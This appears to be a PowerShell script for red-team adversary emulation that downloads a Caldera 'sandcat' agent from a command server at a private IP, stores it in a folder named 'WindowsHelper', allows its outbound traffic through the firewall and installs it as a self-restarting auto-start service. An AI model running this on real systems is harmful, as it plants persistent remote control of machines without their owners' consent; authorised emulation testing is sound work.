# --- CONFIGURACIÓN ---
$agentUrl = "http://10.111.8.251:8888/file/download"
$agentFilename = "caldera-agent.exe"
$installPath = "C:\ProgramData\WindowsHelper"
$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmZip = "$env:TEMP\nssm.zip"
$nssmPath = "C:\nssm"
$serviceName = "RunCalderaAgent"
# -- SET THE GROUP TO WHICH THE AGENT WILL BE ASSIGNED. (CLIENT NAME) --
$agentArgs = "-server http://10.111.8.251:8888 -group red"

# --- CREATE AGENT FOLDER ---
New-Item -Path $installPath -ItemType Directory -Force | Out-Null

# --- DOWNLOAD THE AGENT ---
Invoke-WebRequest -Uri "http://10.111.8.251:8888/file/download" `
  -Headers @{platform="windows"; file="sandcat.go"} `
  -OutFile "$installPath\$agentFilename"
Write-Host "✅ Descargado agente."
# --- CREATE THE FIREWALL RULE ---
New-NetFirewallRule -DisplayName "CalderaAgent Allow Outbound" `
  -Direction Outbound `
  -Program "$installPath\$agentFilename" `
  -Action Allow -Profile Any -ErrorAction SilentlyContinue

# --- DOWNLOAD NSSM ---
Invoke-WebRequest -Uri $nssmUrl -OutFile $nssmZip
Expand-Archive -Path $nssmZip -DestinationPath $nssmPath -Force

# NSSM path
$nssmExe = Get-ChildItem -Path "$nssmPath\nssm-*" -Recurse -Filter nssm.exe |
           Where-Object { $_.FullName -like "*win64*" } |
           Select-Object -First 1 -ExpandProperty FullName

# --- CREATE THE SERVICE WITH NSSM ---
& $nssmExe install $serviceName "$installPath\$agentFilename" $agentArgs

# --- AUTO LAUNCH CONFIGURATION ---
sc.exe config $serviceName start= auto

# --- RECUPERATION CONFIGURATION (RELOAD IF FAIL) ---
sc.exe failure $serviceName reset= 0 actions= restart/5000

# --- START SERVICE ---
Start-Service -Name $serviceName
Write-Host "✅ Servicio $serviceName instalado y en ejecución."
